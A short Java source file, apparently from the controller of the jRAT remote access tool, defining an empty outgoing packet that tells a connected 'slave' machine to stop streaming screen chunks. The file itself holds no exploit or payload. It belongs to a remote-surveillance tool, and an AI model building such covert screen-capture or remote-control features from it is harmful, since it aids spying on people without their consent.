package jrat.module.screen.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;

/**
 * Sent to indicate that we don't want to receive more screen chunks
 */
public class PacketRemoteScreenStop implements OutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 26;
	}

}
